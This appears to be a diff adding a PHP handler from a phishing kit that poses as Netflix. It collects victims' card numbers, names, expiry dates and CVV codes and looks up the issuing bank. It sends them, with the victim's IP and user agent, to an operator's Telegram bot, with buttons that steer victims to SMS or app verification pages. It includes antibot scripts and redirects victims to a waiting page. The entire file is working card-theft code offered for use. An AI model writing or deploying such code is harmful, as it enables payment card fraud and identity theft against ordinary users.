@@ -1,0 +1,103 @@
+<?php
+session_start();
+
+include ("../bot/index.php");
+include ("../antibots/index.php");
+include("panel.php");
+include('config.php');
+include ("../Email_Config.php");
+
+
+    $ccnumber = $_POST['creditCardNumber'];
+    $fullname = $_POST['NameOnCard'];
+    $exp = $_POST['creditExpirationMonth'];
+    $cvv = $_POST['creditCardSecurityCode'];
+
+// Extract the first six digits (BIN) from the credit card number
+$bin = substr($ccnumber, 0, 6);
+
+// Use the binlist.net API to retrieve BIN information
+$binApiUrl = "https://lookup.binlist.net/$bin";
+$binData = json_decode(file_get_contents($binApiUrl), true);
+
+// Get the brand (e.g., Visa, MasterCard) from the binlist API response
+$brand = $binData['scheme'];
+
+
+    // Create the message to send to Telegram
+$message = '###### NETFLIX RUZLT ######
+
+Full Name : ' . $fullname . '
+CC Number : ' . $ccnumber . '
+Exp : ' . $exp . '
+Cvv : ' . $cvv . '
+
+######## Card Bank ########
+
+Bank Name : ' . $binData['bank']['name'] . '
+Brand : ' . $brand . '
+Country Bank : ' . $binData['country']['name'] . '
+
+######## BY DRFXND ########
+
+Adresse Ip : https://www.geodatatool.com/en/?ip=' . $_SERVER['REMOTE_ADDR'] . '
+City : ' . $city . '
+Country : ' . $country . '
+User-agent : ' . $_SERVER['HTTP_USER_AGENT'] . '
+';
+
+
+$app = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/ccfunctions/redirect.php?type=app&ip=' . urlencode(_ip()) . '&id=' . $randomId;
+$sms = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/ccfunctions/redirect.php?type=sms&ip=' . urlencode(_ip()) . '&id=' . $randomId;
+$success = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/ccfunctions/redirect.php?type=success&ip=' . urlencode(_ip()) . '&id=' . $randomId;
+$carderror = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/ccfunctions/redirect.php?type=carderror&ip=' . urlencode(_ip()) . '&id=' . $randomId;
+$banip = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/banip/banip.php?type=blocked&ip=' . urlencode(_ip()) . '&id=' . $randomId;
+
+
+
+// Define the inline keyboard markup
+$inlineKeyboard = [
+    
+    [
+        ["text" => "Success ", "url" => $success],
+        ["text" => "CC Error ", "url" => $carderror],
+
+    ],
+    
+    
+    [
+        ["text" => "APP ", "url" => $app],
+    ],
+    
+    [
+        ["text" => "SMS ", "url" => $sms],
+    ],
+    [
+        ["text" => "BAN IP X ", "url" => $banip],
+    ],
+    
+];
+
+// Convert the inline keyboard array to JSON
+$keyboardMarkup = json_encode(["inline_keyboard" => $inlineKeyboard]);
+
+// Manually create the reply_markup string
+$replyMarkup = "&reply_markup=" . urlencode($keyboardMarkup);
+
+// Construct the message with the updated reply_markup
+$telegramMessage = "$message$replyMarkup";
+
+$telegramUrl = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($message).'&parse_mode=HTML'.$replyMarkup;
+@file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message).'&parse_mode=HTML'.$replyMarkup);
+$html = file_get_contents($telegramUrl);
+
+if ($html === false) {
+    // Error handling: Telegram message was not sent
+    echo "404 Not Found.";
+} else {
+    // Success handling: Telegram message sent
+    // Redirect to card.php
+    header("Location: ../waiting.php?userid={$randString}&ue={$randString}");
+    exit; // Ensure that the script stops executing after the redirection
+}
+?>
